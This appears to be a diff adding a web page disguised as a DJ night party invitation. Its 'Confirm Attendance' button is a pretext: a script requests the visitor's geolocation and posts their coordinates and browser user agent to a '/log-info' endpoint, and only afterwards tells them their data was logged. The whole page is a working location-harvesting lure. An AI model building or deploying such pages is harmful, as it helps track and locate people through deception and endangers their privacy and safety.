@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>DJ Night Invite</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: black;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            display: inline-block;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #ff4081;
+            border: none;
+            color: white;
+            font-size: 16px;
+            margin-top: 20px;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>You're Invited!</h1>
+        <h2>DJ Night Extravaganza</h2>
+        <p>Join us for a night of music, dance, and fun!</p>
+        <p><strong>Date:</strong> June 15, 2025</p>
+        <p><strong>Time:</strong> 9 PM onwards</p>
+        <p><strong>Location:</strong> Club Groove, Downtown</p>
+        <button onclick="sendInfo()">Confirm Attendance</button>
+    </div>
+
+    <script>
+        function sendInfo() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    const data = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        userAgent: navigator.userAgent
+                    };
+
+                    fetch('/log-info', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    }).then(() => {
+                        alert('Thanks! Your location and device info have been logged.');
+                    }).catch(() => {
+                        alert('Could not send data.');
+                    });
+                }, function (error) {
+                    alert('Geolocation permission denied or unavailable.');
+                });
+            } else {
+                alert('Geolocation not supported by this browser.');
+            }
+        }
+    </script>
+</body>
+</html>
